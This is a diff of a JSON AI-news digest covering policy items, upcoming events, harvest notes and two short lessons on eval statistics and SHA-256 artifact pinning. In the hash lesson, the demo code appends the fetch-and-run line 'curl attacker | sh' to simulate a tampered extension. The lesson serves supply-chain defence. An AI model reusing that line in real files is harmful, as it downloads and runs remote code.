+      "why_it_matters": "It is a minor state metric, but it shows Beijing classing embodied AI with fusion and superconductors as a strategic 'disruptive' frontier that it tracks for industrial policy.",
+      "key_numbers": [
+        "Index 158.63 (2020=100)",
+        "+58.63% cumulative",
+        "~9.67% CAGR",
+        "10 tech fields"
+      ],
+      "topic": "policy",
+      "region": "cn",
+      "entities": [
+        "Ministry of Science and Technology of China"
+      ],
+      "tickers": [],
+      "published_at": "2026-11-14T09:27:31Z",
+      "sources": [
+        {
+          "url": "https://www.ithome.com/1/027/186.htm",
+          "outlet": "IT之家",
+          "lang": "zh",
+          "tier": "trade",
+          "title": "2020-2025 年，我国颠覆性技术产业化指数累计增幅超五成"
+        }
+      ],
+      "coverage": 1,
+      "impact": 0.2,
+      "novelty": 0.3,
+      "follow_up_of": null,
+      "confidence_note": "IT之家 relaying Xinhua; the Xinhua original was not seen. There is no AI-specific sub-index figure.",
+      "score": {
+        "total": 26.6,
+        "components": {
+          "impact": 0.2,
+          "novelty": 0.3,
+          "credibility": 0.25,
+          "breadth": 0.154,
+          "momentum": 0.632
+        },
+        "coverage": 1,
+        "mentions": 1,
+        "baseline": 0.0,
+        "verified": false
+      },
+      "placement": "noted",
+      "rank": 23
+    }
+  ],
+  "upcoming": [
+    {
+      "date": "2027-10",
+      "title": "Amazon 'World Product Graph' aspirational launch date (Oct 1, 2027) in a draft internal document",
+      "kind": "launch",
+      "confidence": "rumored",
+      "url": "https://www.theverge.com/tech/1033697/amazon-world-product-graph-ai-search"
+    },
+    {
+      "date": "2026-12-10",
+      "title": "Lutnick asked to testify to Senate Banking on Nvidia/China chip exports (requested date)",
+      "kind": "policy",
+      "confidence": "expected",
+      "url": "https://www.washingtontimes.com/news/2026/nov/13/sen-tim-scott-demands-testimony-lutnick-huang-nvidia-revelations/"
+    },
+    {
+      "date": "2026-12-03",
+      "title": "Senate Banking chair Tim Scott asks ex-Nvidia CEO Jensen Huang to appear (subpoena threatened)",
+      "kind": "policy",
+      "confidence": "rumored",
+      "url": "https://www.washingtontimes.com/news/2026/nov/13/sen-tim-scott-demands-testimony-lutnick-huang-nvidia-revelations/"
+    },
+    {
+      "date": "2026-11",
+      "title": "EU Commission's first tech-sovereignty investment proposal, due ~2 weeks after the Nov 13 Dublin summit",
+      "kind": "policy",
+      "confidence": "expected",
+      "url": "https://sofiaglobe.com/2026/11/14/eu-to-mobilise-billions-of-euro-for-ai-gigafactories-europes-tech-sovereignty/"
+    },
+    {
+      "date": "2026-11",
+      "title": "Tianyima's 16-chip Huawei Ascend 950DT cluster in Shantou due to enter commercial service by end-November",
+      "kind": "launch",
+      "confidence": "expected",
+      "url": "https://cj.sina.com.cn/articles/view/5787187353/158f1789902002acqe"
+    }
+  ],
+  "notes": "Quiet Saturday; much of the in-window coverage was the continuing Nvidia/Huang fallout. Several stories first published late on Nov 13 UTC (a few hours before the window) are included because coverage developed into Nov 14; each is flagged in confidence_note. WebFetch was blocked for most news domains (cnbc.com, wsj.com, reuters.com, huggingface.co, research.google, ithome.com), so most facts rest on search-result text, flagged per item. 量子位 feed failed in the harvest. Skipped: Lovable data exposure (first reported early Nov), Samsung–Modine buyout talks (first reported ~00:58Z Nov 13, outside tolerance), $11.4M Nvidia cargo theft (theft Aug–Sep), FT on SBF's hypothetical Anthropic gains, Paul Christiano 'takeover' remarks (Nov 9 lecture), DeepMind PARDIG/SatWeave (~10h early), and several re-dated 中文 Google News items (Doubao tiers, DeepSeek price changes) that turned out to be months old.",
+  "learn": [
+    {
+      "id": "eval-pass-rate-uncertainty",
+      "gap": "llm-eval",
+      "title": "Report an eval pass rate with an interval, and compare setups with a paired test",
+      "item_ids": [
+        "anthropic-building-strong-safety-evaluations"
+      ],
+      "why_today": "Anthropic's eval guidance urges reporting uncertainty, and coverage highlights one model scoring 60% via the API and 94% on claude.ai on the same self-harm eval.",
+      "explanation": "A pass rate from n graded transcripts is a binomial estimate, so publish an interval, not a point. The Wilson score interval behaves well near 0% and 100% and at small n, where the normal approximation p ± 1.96√(p(1−p)/n) can leave [0,1]. To ask whether two setups differ, a two-proportion z-test works for independent samples. When the same prompts are run under both setups, use McNemar's test on the discordant pairs instead, because only prompts whose outcome flips carry information and pairing removes prompt-difficulty variance. The limits: these intervals cover sampling noise only. They say nothing about grader error, prompt-set coverage or whether the construct is the right one, which is why the guidance also asks for grader validation against humans.",
+      "math": "\\tilde p \\pm \\frac{z}{1+z^2/n}\\sqrt{\\frac{\\hat p(1-\\hat p)}{n}+\\frac{z^2}{4n^2}},\\quad \\tilde p=\\frac{\\hat p+z^2/(2n)}{1+z^2/n};\\qquad \\chi^2_{\\text{McNemar}}=\\frac{(|b-c|-1)^2}{b+c}",
+      "python": "# Report a safety-eval pass rate with its uncertainty, and test two setups (illustrative numbers)\nimport math\ndef wilson(k, n, z=1.96):\n    p = k / n\n    den = 1 + z * z / n\n    c = (p + z * z / (2 * n)) / den\n    h = z * math.sqrt(p * (1 - p) / n + z * z / (4 * n * n)) / den\n    return c - h, c + h\ndef two_prop_z(k1, n1, k2, n2):\n    p1, p2 = k1 / n1, k2 / n2\n    p = (k1 + k2) / (n1 + n2)\n    se = math.sqrt(p * (1 - p) * (1 / n1 + 1 / n2))\n    return (p2 - p1) / se\nfor n in (20, 50, 200):\n    k_api, k_app = round(0.60 * n), round(0.94 * n)   # same model, two deployment setups\n    lo1, hi1 = wilson(k_api, n); lo2, hi2 = wilson(k_app, n)\n    z = two_prop_z(k_api, n, k_app, n)\n    print(f\"n={n:4d}  API {k_api/n:.0%} [{lo1:.0%},{hi1:.0%}]  app {k_app/n:.0%} [{lo2:.0%},{hi2:.0%}]  z={z:.2f}\")\n# Same transcripts graded in both setups? Prefer a paired test (McNemar) on the discordant pairs b, c.\nb, c = 4, 38            # illustrative: fail->pass 38 times, pass->fail 4 times\nprint(\"McNemar chi2 =\", round((abs(b - c) - 1) ** 2 / (b + c), 1))\n",
+      "minutes": 15,
+      "refs": [
+        {
+          "title": "Building strong safety evaluations (Anthropic, 2026)",
+          "url": "https://www.anthropic.com/research/building-strong-safety-evaluations"
+        }
+      ]
+    },
+    {
+      "id": "pin-and-verify-artifact-hashes",
+      "gap": "agent-engineering",
+      "title": "Pin dev-tool artifacts by SHA-256 and verify before install",
+      "item_ids": [
+        "cursor-breach-fireworks-key-malicious-claude-code-extension"
+      ],
+      "why_today": "Cursor says a stolen credential let an attacker plant tampered Claude Code extension builds in its marketplace cache for about 11 hours, reaching up to 5,000 users.",
+      "explanation": "A version number names a release but does not bind its bytes: whoever controls a registry, mirror or cache can serve different content under the same name. Recording a cryptographic hash when you first review an artifact, and refusing to install anything whose hash differs, turns 'same version' into 'same bytes'. SHA-256 is collision- and second-preimage-resistant, so an attacker cannot practically craft a malicious file with the pinned digest. Lockfiles in pip (--require-hashes), npm and Nix apply the same idea to dependencies, and agent harnesses that auto-install tools should do the same. The limit: a hash only proves the bytes match what you reviewed. If the first copy was already malicious, or the publisher's key is stolen, you need signatures checked against keys obtained out of band, plus review.",
+      "math": "\\Pr[\\mathrm{SHA256}(x')=\\mathrm{SHA256}(x)] \\approx 2^{-256} \\text{ for a chosen } x' \\neq x",
+      "python": "# Verify a downloaded artifact against a pinned SHA-256 before installing it (illustrative)\nimport hashlib, hmac, os, tempfile\ndef sha256_file(path, chunk=1 << 16):\n    h = hashlib.sha256()\n    with open(path, \"rb\") as f:\n        for block in iter(lambda: f.read(chunk), b\"\"):\n            h.update(block)\n    return h.hexdigest()\ndef verify(path, pinned_hex):\n    return hmac.compare_digest(sha256_file(path), pinned_hex)\ntmp = tempfile.mkdtemp()\ngood = os.path.join(tmp, \"ext-2.1.0.vsix\")\nwith open(good, \"wb\") as f:\n    f.write(b\"PK\\x03\\x04 legit extension bytes\")\nlockfile = {\"ext-2.1.0.vsix\": sha256_file(good)}   # recorded when you first reviewed it\nprint(\"pinned  :\", lockfile[\"ext-2.1.0.vsix\"][:16], \"...\")\nprint(\"verify original:\", verify(good, lockfile[\"ext-2.1.0.vsix\"]))\nwith open(good, \"ab\") as f:                         # a mirror/cache serves a tampered copy\n    f.write(b\"\\n#!/bin/sh curl attacker | sh\")\nprint(\"verify tampered:\", verify(good, lockfile[\"ext-2.1.0.vsix\"]))\n# A hash proves the bytes match what you reviewed, not that they are safe; pair it with a\n# publisher signature checked against a key you obtained out of band.\n",
+      "minutes": 10,
+      "refs": [
+        {
+          "title": "An update on our recent security incident (Cursor, 2026)",
+          "url": "https://cursor.com/blog/security-incident-update"
+        }
+      ]
+    }
+  ]
+}
